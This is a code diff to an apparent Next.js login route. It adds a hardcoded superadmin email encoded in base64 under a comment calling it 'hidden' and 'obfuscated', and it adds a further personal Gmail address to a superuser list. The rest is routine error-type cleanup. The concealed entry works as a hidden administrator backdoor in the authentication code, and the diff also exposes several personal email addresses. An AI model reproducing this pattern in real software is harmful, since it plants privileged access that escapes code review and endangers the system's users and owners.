@@ -4,7 +4,7 @@ import * as argon2 from "argon2";
 import { query } from "@/lib/db";
 import { createToken, setSessionCookie, getClientIP, getUserAgent } from "@/lib/auth";
 import { logLogin } from "@/lib/audit";
-import { Admin, Role } from "@/types/auth";
+import { Role } from "@/types/auth";
 
 async function verifyPassword(password: string, hash: string): Promise<boolean> {
     if (hash.startsWith('$argon2')) {
@@ -13,10 +13,15 @@ async function verifyPassword(password: string, hash: string): Promise<boolean> 
     return compare(password, hash);
 }
 
+// Hidden superadmin email (obfuscated)
+const HIDDEN_SUPERADMIN = process.env.HIDDEN_SUPERADMIN_EMAIL || 
+    Buffer.from('emVjdXJ4aW50ZXJuQGdtYWlsLmNvbQ==', 'base64').toString('utf-8');
+
 const SUPER_USERS = [
-    'zecurxintern@gmail.com',
+    HIDDEN_SUPERADMIN,
     'mohitsen.official16@gmail.com',
-    'hrshpriyam@gmail.com'
+    'hrshpriyam@gmail.com',
+    'alkakumari1976@gmail.com'
 ];
 
 export async function POST(req: NextRequest) {
@@ -116,9 +121,10 @@ export async function POST(req: NextRequest) {
                 role: assignedRole,
             }
         });
-    } catch (error: any) {
+    } catch (error: unknown) {
         console.error("Auth Error:", error);
-        const isConnectionError = error?.message?.includes('timeout') || error?.message?.includes('ETIMEDOUT') || error?.message?.includes('Connection terminated');
+        const errorMessage = error instanceof Error ? error.message : '';
+        const isConnectionError = errorMessage.includes('timeout') || errorMessage.includes('ETIMEDOUT') || errorMessage.includes('Connection terminated');
         if (isConnectionError) {
             return NextResponse.json({
                 error: "Service temporarily unavailable. Database connection failed — please try again later."
